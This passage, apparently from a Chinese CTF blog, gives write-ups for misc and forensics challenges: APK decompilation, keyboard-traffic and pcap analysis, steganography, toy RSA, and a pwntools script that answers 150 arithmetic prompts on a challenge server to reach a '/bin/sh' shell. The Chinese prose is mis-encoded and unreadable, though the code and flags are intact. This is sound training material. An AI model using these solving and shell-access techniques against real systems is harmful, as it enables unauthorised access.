ç®€å•åç¼–è¯‘é™„ä»¶ç»™å‡ºçš„ APKï¼Œåœ¨ <code>com/sagold/cfievent/LoginActivity.java</code> ä¸‹å¯ä»¥æ‰¾åˆ°å¦‚ä¸‹ä»£ç ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DUMMY_CREDENTIALS = &#123;<span class="string">&quot;alerionMascot@CFIUL.com:HappyFirstYear&quot;</span>&#125;;</span><br></pre></td></tr></table></figure><p>å¾ˆå®¹æ˜“å‘ç°è¿™ä¸ª APP å®ç°äº†ç™»å½•å¹¶ä¸”ç™»å½•ä¸Šå»å°±ä¼šæ˜¾ç¤º flagã€‚æ—¢ç„¶è´¦å·å¯†ç éƒ½å·²ç»æ‹¿åˆ°äº†ï¼Œä¸å¦¨å®‰è£…ä¸€ä¸‹å¹¶ç™»å½•ã€‚ç„¶è€Œç™»å½•ä¸Šå»äº†ä¹Ÿæ²¡ flagã€‚ä½†æ˜¯ä»£ç çš„å®ç°é€»è¾‘ç¡®å®æ˜¯è¿™æ ·çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span> <span class="comment">// android.support.v7.app.AppCompatActivity, android.support.v4.app.SupportActivity, android.support.v4.app.FragmentActivity</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(<span class="meta">@Nullable</span> Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView(R.layout.activity_information);</span><br><span class="line">        <span class="keyword">if</span> (getIntent().getBooleanExtra(IS_ADMIN, <span class="keyword">false</span>)) &#123;</span><br><span class="line">            showLoginFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘å»æŸ¥äº† WriteUpï¼Œå…¶ä¸­æè¿°å¦‚ä¸‹ã€‚</p><blockquote><p>With a internet connection, the flag will appear under the CFI logo.</p></blockquote><p>Fineï¼Œé‚£ä¹ˆè¿™é¢˜çš„ flag å¯èƒ½å‡ºäº†ç‚¹é—®é¢˜ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CFI&#123;DOUMMY_creeeeeddddd_issSoFriENDlieee_QUACKKKK&#125;</span><br></pre></td></tr></table></figure><h3 id="watevrCTF-2019-Polly"><a href="#watevrCTF-2019-Polly" class="headerlink" title="[watevrCTF 2019]Polly"></a>[watevrCTF 2019]Polly</h3><p>é™„ä»¶ç»™å‡ºçš„æ˜¯ä¸€ä¸ªæ–¹ç¨‹ï¼Œæ¨æµ‹å…¶ x ä¸ºä¸åŒå–å€¼æ—¶å¯ä»¥æ±‚å¾— flagã€‚å› æ­¤å†™å‡ºå¦‚ä¸‹ä»£ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CalculateX</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="comment"># è¿™é‡Œå†™æ–¹ç¨‹ï¼Œå¤ªé•¿äº†å°±ä¸è´´äº†</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(CalculateX(i)))</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå› ä¸ºæ–¹ç¨‹æ•°å­—å¤ªå¤§äº†ï¼Œéœ€è¦ä½¿ç”¨ sagemath æ‰èƒ½ç®—å‡ºå‡†ç¡®ç»“æœã€‚ç®—å‡ºå‰ 100 ä½å¯çŸ¥å…¶ä¸­å«æœ‰ flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">watevr&#123;polly_polynomials_youtube.com&#x2F;watch?v&#x3D;THNWVVn9JO0&#125;</span><br></pre></td></tr></table></figure><h3 id="BSidesSF2019-thekey"><a href="#BSidesSF2019-thekey" class="headerlink" title="[BSidesSF2019]thekey"></a>[BSidesSF2019]thekey</h3><p>ç®€å•çš„é”®ç›˜æµé‡åˆ†æï¼Œ Leftover Capture Data æå–å‡ºæ¥å†ä½¿ç”¨ USB Keyboard Data Hacker è·‘ä¸€ä¸‹å¯å¾—å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] Found : viim&lt;SPACE&gt;flaag.ttxt&lt;RET&gt;iTthe&lt;SPACE&gt;flaag&lt;SPACE&gt;is&lt;SPACE&gt;ctf&lt;ESC&gt;vbUuA&#123;[my_favoritte_editor_is_vim&#125;&lt;ESC&gt;hhhhhhhhhhhhhhhhhhhau&lt;ESC&gt;vi&#123;U&lt;ESC&gt;&quot;;wq&lt;RET&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf&#123;MY_FAVOURITE_EDITOR_IS_VIM&#125;</span><br></pre></td></tr></table></figure><h3 id="watevrCTF-2019-Unspaellablle"><a href="#watevrCTF-2019-Unspaellablle" class="headerlink" title="[watevrCTF 2019]Unspaellablle"></a>[watevrCTF 2019]Unspaellablle</h3><p>é™„ä»¶ç»™å‡ºäº†ä¸€ä»½è„šæœ¬ï¼Œç¨å¾®æ‰¾ä¸€ä¸‹å¯ä»¥å‘ç°å…¶åŸæœ¬çš„è„šæœ¬ã€‚</p><blockquote><p><a href="https://imsdb.com/transcripts/Stargate-SG1-Children-Of-The-Gods.html">https://imsdb.com/transcripts/Stargate-SG1-Children-Of-The-Gods.html</a></p></blockquote><p>å°†ä¸¤ä»½è„šæœ¬ä½¿ç”¨ CyberChef è¿›è¡Œæ¯”è¾ƒå³å¯å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1617531493659/3f5fc9a3d635634d696e0d102426afa74dc34fed.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">watevr&#123;icantspeel_tiny.cc&#x2F;2qtdez&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2017-remote-multimedia-controller"><a href="#INSHack2017-remote-multimedia-controller" class="headerlink" title="[INSHack2017]remote-multimedia-controller"></a>[INSHack2017]remote-multimedia-controller</h3><p>é™„ä»¶è§£å‹ä¹‹åå¾—åˆ°ä¸€ä¸ªæµé‡åŒ…ï¼Œä½¿ç”¨ Wireshark è·Ÿè¸ªåˆ° TCP æµ 2 å¯å¾—ä¸€ä¸² base64 å­—ç¬¦ä¸²ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1617531815294/0944ebc199ad8e033b56fa227d15d4710ac93c04.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vmxkd1NrNVhVbk5qUlZKU1ltdGFjRlJYZEhOaWJFNVhWR3RPV0dKVmJEWldiR1JyV1ZkS1ZXRXphRnBpVkVaVFYycEtVMU5IUmtobFJYQlRUVmhDTmxZeFdtdGhhelZ5WWtWYWFWSlViRmRVVlZaYVRURmFjbFpyT1ZaV2JXUTJWa1pvYTFkck1YVlVhbHBoVWxack1GUlZaRXRqVmxaMVZHMTRXRkpVUlRCWFdIQkdUbGRHY2s1VmFFOVdNWEJoV1Zkek1XSldaSFJPVm1SclZsZDRXbFJWVm5wUVVUMDk&#x3D;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ CyberChef å¥—å¨ƒè§£ç åå¯å¾—å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Good job ! You found the flag: INSA&#123;TCP_s0ck3t_4n4lys1s_c4n_b3_fun!&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;TCP_s0ck3t_4n4lys1s_c4n_b3_fun!&#125;</span><br></pre></td></tr></table></figure><h3 id="GWCTF2019-math"><a href="#GWCTF2019-math" class="headerlink" title="[GWCTF2019]math"></a>[GWCTF2019]math</h3><p>é™„ä»¶ç»™å‡ºçš„æ˜¯ä¸€ä¸ª ELF æ–‡ä»¶ï¼Œä½¿ç”¨ IDA æŸ¥çœ‹å¯ä»¥å‘ç°å¦‚ä¸‹é€»è¾‘ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Pass 150 levels and i will give you the flag~&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;====================================================&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now level %d\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v9);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Math problem: %d * %d - %d + %d = ??? &quot;</span>, v4, v5, v6, v7);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Give me your answer:&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">0x80</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)strtol(&amp;buf, <span class="number">0LL</span>, <span class="number">0xA</span>) != v5 * v4 - v6 + v7 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try again?&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Right! Continue~&quot;</span>);</span><br><span class="line">++v9;</span><br><span class="line">sleep((<span class="keyword">unsigned</span> __int64)<span class="string">&quot;Right! Continue~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v9 &lt;= <span class="number">0x95</span> );</span><br><span class="line">  <span class="keyword">if</span> ( v9 != <span class="number">0x96</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Congratulation!&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>å› æ­¤éœ€è¦è¿ç»­è®¡ç®—æ­£ç¡® 150 æ¬¡è®¡ç®—é¢˜ï¼Œè€Œä¸”éœ€è¦ä¸è¿œç¨‹äº¤äº’ã€‚å› æ­¤ç”¨ pwntools æ¥å†™è„šæœ¬å®ç°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">process = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26631</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">150</span>):</span><br><span class="line">    process.recvuntil(<span class="string">&#x27;Math problem: &#x27;</span>)</span><br><span class="line">    expression = process.recvuntil(<span class="string">&#x27;=&#x27;</span>).decode().replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    expression = expression.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    expression = expression.translate(<span class="built_in">str</span>.maketrans(<span class="string">&quot;+-*/&quot;</span>, <span class="string">&quot;    &quot;</span>))</span><br><span class="line">    expression = expression.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(expression))</span><br><span class="line">    process.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(expression[<span class="number">0</span>]) * <span class="built_in">int</span>(expression[<span class="number">1</span>]) - <span class="built_in">int</span>(expression[<span class="number">2</span>]) + <span class="built_in">int</span>(expression[<span class="number">3</span>])))</span><br><span class="line">process.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0e6a2af0-83e3-4fce-8535-a5bfd4c4cca9&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2018-Spreadshit"><a href="#INSHack2018-Spreadshit" class="headerlink" title="[INSHack2018]Spreadshit"></a>[INSHack2018]Spreadshit</h3><p>é™„ä»¶ä¸­ç»™å‡ºäº†ä¸€ä¸ª ods æ–‡ä»¶ï¼Œå°†å…¶ä½¿ç”¨ Excel æ‰“å¼€ï¼ŒæŸ¥æ‰¾å¹¶é€‰ä¸­å…¨éƒ¨ç©ºæ ¼å¯å¾— flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1617533032620/594e9b72117b159171e3f5e483ffbc3b612c5979.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;3cf6463910edffb0&#125;</span><br></pre></td></tr></table></figure><h3 id="DDCTF2018-â•¯Â°â–¡Â°ï¼‰â•¯ï¸µ-â”»â”â”»"><a href="#DDCTF2018-â•¯Â°â–¡Â°ï¼‰â•¯ï¸µ-â”»â”â”»" class="headerlink" title="[DDCTF2018](â•¯Â°â–¡Â°ï¼‰â•¯ï¸µ â”»â”â”»"></a>[DDCTF2018](â•¯Â°â–¡Â°ï¼‰â•¯ï¸µ â”»â”â”»</h3><p>é¢˜ç›®ç»™å‡ºçš„é™„ä»¶æœ‰å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd</span><br></pre></td></tr></table></figure><p>å°è¯•ç”¨ CyberChef çš„ <code>From Hex</code> è§£ç ï¼Œå¾—åˆ°äº†ä¸å¯è¯»çš„å­—ç¬¦ä¸²ï¼Œè€ƒè™‘åˆ°å­—ç¬¦ä¸²æœ¬èº«å¯èƒ½ç»è¿‡äº†è¿ç®—ã€‚çŒœæµ‹æœ€åä¸€ä¸ªå­—ç¬¦ <code>0xfd</code> åº”è¯¥ä¸ flag çš„ç»“å°¾ä¹Ÿå°±æ˜¯ <code>&#125;</code> å­—ç¬¦ç›¸å¯¹åº”ï¼Œä¹Ÿå°±æ˜¯åŸæœ¬åº”è¯¥æ˜¯ <code>0x7d</code>ã€‚å› æ­¤å°è¯•å°†æ­¤å‰å¾—åˆ°çš„ç»“æœå‡å» <code>0x80</code>ï¼Œå¾—åˆ°äº†å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recipe&#x3D;From_Hex(&#39;None&#39;)SUB(%7B&#39;option&#39;:&#39;Hex&#39;,&#39;string&#39;:&#39;0x80&#39;%7D)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">That was fast! The flag is: DDCTF&#123;922ab9974a47cd322cf43b50610faea5&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDCTF&#123;922ab9974a47cd322cf43b50610faea5&#125;</span><br></pre></td></tr></table></figure><h3 id="SUCTF-2019-Game"><a href="#SUCTF-2019-Game" class="headerlink" title="[SUCTF 2019]Game"></a>[SUCTF 2019]Game</h3><p>å¯ä»¥åœ¨é™„ä»¶ç»™å‡ºçš„ä»£ç ä¸­çš„ index.html ä¸­æ‰¾åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;here is your flag:ON2WG5DGPNUECSDBNBQV6RTBNMZV6RRRMFTX2===&quot;</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ Base32 è§£ç å­—ç¬¦ä¸²åå¾—åˆ°äº†å‡ flag <code>suctf&#123;hAHaha_Fak3_F1ag&#125;</code>ï¼Œäºæ˜¯å°†åˆ†æè½¬å‘å›¾ç‰‡ã€‚ä½¿ç”¨ StegSolve å¯è§£å¾—å›¾ç‰‡ä¸­åŒ…å«çš„éšå†™å†…å®¹ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1617951898429/a16261b648a2027994036e9a6bbdb1f18e7354eb.png"></p><p>å°†å…¶æå–å‡ºæ¥å¯ä»¥å¾—åˆ°å¦‚ä¸‹å†…å®¹ï¼Œæ¨æµ‹å…¶æ˜¯ AES åŠ å¯†ä¹‹åçš„å¯†æ–‡ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To&#x2F;KeuHg8vKAxFrVQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä¹‹å‰å¾—åˆ°çš„å‡ flag ä½œä¸º key å¯¹å¯†æ–‡è¿›è¡Œ Triple DES è§£å¯†å¯å¾—çœŸæ­£çš„ flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1617952553631/29833ec1ff22a56cdedf21d6707ef9f8cc6ba3dc.png" alt="image-20210409151553062"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">suctf&#123;U_F0und_1t&#125;</span><br></pre></td></tr></table></figure><h3 id="GUET-CTF2019-è™šå‡çš„å‹ç¼©åŒ…"><a href="#GUET-CTF2019-è™šå‡çš„å‹ç¼©åŒ…" class="headerlink" title="[GUET-CTF2019]è™šå‡çš„å‹ç¼©åŒ…"></a>[GUET-CTF2019]è™šå‡çš„å‹ç¼©åŒ…</h3><p>è§£å‹é™„ä»¶å¾—åˆ°çœŸå®çš„å‹ç¼©åŒ…å’Œè™šå‡çš„å‹ç¼©åŒ…ã€‚è™šå‡çš„å‹ç¼©åŒ…æ˜¯ä¼ªåŠ å¯†ï¼Œå°†å…¶ deFlags ä¿®æ”¹æˆ 0 å³å¯è§£å‹å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">æ•°å­¦é¢˜</span><br><span class="line">n &#x3D; 33</span><br><span class="line">e &#x3D; 3</span><br><span class="line">è§£26</span><br><span class="line"></span><br><span class="line">-------------------------</span><br><span class="line">ç­”æ¡ˆæ˜¯</span><br></pre></td></tr></table></figure><p>å¾ˆå®¹æ˜“çœ‹å‡ºè¿™æ˜¯ç®€å•çš„ RSAã€‚å°† $n$ åˆ†è§£ä¸º $11 \times 3$ å¯å¾—å…¶æ¬§æ‹‰å€¼ä¸º $\rho{(n)} = (11 - 1) \times (3 - 1) = 20$ï¼Œ$d \times e \mod  20 \equiv 1$ï¼Œç®—å¾— $d = 7.$ <code>pow(c,d,n) = pow(26,7,33) = 5</code>ã€‚å› æ­¤å¾—åˆ°äº† <code>ç­”æ¡ˆæ˜¯5</code>ã€‚å°†å…¶ä½œä¸ºå‹ç¼©åŒ…å¯†ç è§£å‹çœŸå®çš„å‹ç¼©åŒ…ã€‚</p><p>è§£å‹å¾—åˆ°äº†ä¸€å¼ å›¾ç‰‡å’Œä¸€æ®µæ–‡æœ¬ã€‚ä½¿ç”¨ 010 editor æ‰“å¼€å›¾ç‰‡å¹¶è¿è¡Œ PNG æ¨¡æ¿å¯ä»¥å‘ç°çˆ†å‡ºäº†ç†Ÿæ‚‰çš„ CRC Mismatchã€‚å°è¯•ä½¿ç”¨å›¾ç‰‡å®½é«˜çˆ†ç ´è„šæœ¬ä¿®æ­£å®½é«˜ä¸º <code>(&#39;hex:&#39;, &#39;0xc6&#39;, &#39;0xf2&#39;)</code>ï¼Œå¾—åˆ°äº†å¦‚ä¸‹å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1617956195657/6508ef9faa1c65a9fc51d3d8a75b511f602ad1f6.png"></p><p>æ­¤æ—¶å¯çŸ¥éœ€è¦å°†å¾—åˆ°çš„æ–‡æœ¬äº¦æˆ– 5ï¼Œå†™ä¸ªè„šæœ¬æ¥å®ç°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="built_in">open</span>(<span class="string">&quot;äº¦çœŸäº¦å‡&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">result = <span class="built_in">open</span>(<span class="string">&quot;result.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">[result.write(<span class="built_in">hex</span>(<span class="built_in">int</span>(i, <span class="number">16</span>) ^ <span class="number">5</span>)[<span class="number">2</span>:]) <span class="keyword">for</span> i <span class="keyword">in</span> text]</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨è„šæœ¬å°†æ–‡ä»¶ä¸­çš„å†…å®¹å¤„ç†è¿‡åå†å°†å¾—åˆ°çš„å†…å®¹ <code>From Hex</code> è§£ç ä¸€æ¬¡å¯ä»¥å¾—åˆ°ä¸€ä¸ª Word æ–‡æ¡£ã€‚å°†å…¶æ‰“å¼€åå¯ä»¥åœ¨æ–‡ç« æœ«å°¾å‘ç°è¶…å‡ºæ–‡æœ¬çš„çº¢è‰²æ³¢æµªçº¿ã€‚å› æ­¤å°è¯•å°†è¶…å‡ºçš„éƒ¨åˆ†çš„å­—ä½“é¢œè‰²è°ƒæ·±ï¼Œæ­¤æ—¶å¯ä»¥å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1617957812594/6e4ccd1e34330549961c4b6999ee0611377ca96d.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;_th2_7ru8_2iP_&#125;</span><br></pre></td></tr></table></figure><h3 id="èœ˜è››ä¾ å‘€"><a href="#èœ˜è››ä¾ å‘€" class="headerlink" title="èœ˜è››ä¾ å‘€"></a>èœ˜è››ä¾ å‘€</h3><blockquote><p>å°†ä½ è·å¾—çš„æ˜æ˜¾ä¿¡æ¯md5åŠ å¯†ä¹‹åä»¥flag{xxx}çš„æ ¼å¼æäº¤ã€‚</p></blockquote><p>Wireshark åˆ†æé™„ä»¶ç»™å‡ºçš„æµé‡åŒ…ï¼Œè·Ÿè¸ª TCP æµ 1 å¯ä»¥å‘ç°ä¸€ä¸ª <code>GET /no_flag.zip</code> å“åº”ä¸º 304 çš„è¯·æ±‚ã€‚å†åˆ†æ ICMP åè®®çš„æµé‡ï¼Œå¯ä»¥å‘ç°å…¶ä¸­åŒ…å«ç€æ•°æ®ã€‚ä½¿ç”¨ tshark <code>tshark -r .\out.pcap -T fields -e data &gt; data.txt </code> å°†å…¶ä¸­çš„æ•°æ®æå–å‡ºæ¥ã€‚å°†æå–å¾—åˆ°çš„æ•°æ®ç®€å•å¤„ç†åç”¨ CyberChef é€šè¿‡ <code>Unique --&gt; From Hex</code> åå¯ä»¥å¾—åˆ°ä¸€ä¸ªä»¥ <code>$$START$$-----BEGIN CERTIFICATE-----</code> å¼€å¤´çš„æ–‡ä»¶ã€‚å°† <code>$$START$$</code> å»é™¤æ‰ä¹‹åå†å°†è¯ä¹¦æ ¼å¼ä»¥åŠæ¢è¡Œå»æ‰åè§£ Base64 ç¼–ç ï¼Œå¯å¾—ä¸€ä¸ªå‹ç¼©æ–‡æ¡£ã€‚è§£å‹ä¹‹åå¯å¾—ä¸€ä¸ªååˆ†å¡é¡¿çš„ GIF å›¾ç‰‡ï¼ŒçŒœæµ‹å«æœ‰æ—¶é—´éšå†™ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/album/4df72543-170c-4dff-a021-5bc0cff9f636/1617986423582/528f41484ec1ecfecc3ba41bc4c244514ad46067.gif"></p><p>ä½¿ç”¨ <code>ImageMagick identify</code> å·¥å…·æ‰§è¡Œ <code>identify -verbose .\flag.gif </code> å¹¶å°†ç»“æœæ•´ç†åå¯ä»¥å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">20 50 50 20 50 50 20 50 20 50 20 20 20 50 20 20 20 20 50 50 20 50 20 50 20 50 20 50 50 50 50 50 20 20 50 50 20 20 20 50 20 50 50 50 20 50 20 20 66 66</span><br></pre></td></tr></table></figure><p>å°†æœ€åçš„ä¸¤ä¸ª <code>66</code> å»é™¤ï¼Œå°† <code>20</code> æ›¿æ¢æˆ 0ï¼Œ<code>50</code> æ›¿æ¢æˆ 1ã€‚å†äºŒè¿›åˆ¶è½¬å­—ç¬¦ä¸²å¯å¾—åˆ° <code>mD5_1t</code>ã€‚å°†å…¶ MD5 ä¸€æ¬¡å¯ä»¥å¾—åˆ° <code>f0f1003afe4ae8ce4aa8e8487a8ab3b6</code>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f0f1003afe4ae8ce4aa8e8487a8ab3b6&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2017-10-cl0v3rf13ld-lane-signal"><a href="#INSHack2017-10-cl0v3rf13ld-lane-signal" class="headerlink" title="[INSHack2017]10-cl0v3rf13ld-lane-signal"></a>[INSHack2017]10-cl0v3rf13ld-lane-signal</h3><p>ä¿®æ­£æ‰€å¾—é™„ä»¶çš„æ–‡ä»¶æ‹“å±•åä¸º JPGï¼Œè¿è¡Œ 010 editor çš„æ¨¡æ¿å¯ä»¥å¾ˆå®¹æ˜“çœ‹åˆ°æ–‡ä»¶æœ«å°¾æœ‰å¦å¤–ä¸€å¼  PNG æ–‡ä»¶ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618125315933/30c582c581d25d6803d4db40d46414761be08a2c.png"></p><p>å°† PNG æ–‡ä»¶æå–å‡ºæ¥å¾—åˆ°ä¸‹å›¾ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618125452952/e5e59e90f471a44b4feeef64916213d8591aee6a.png"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618125486724/31cb9ea5717ed0e1c64e0135589a7144a02715bb.png" 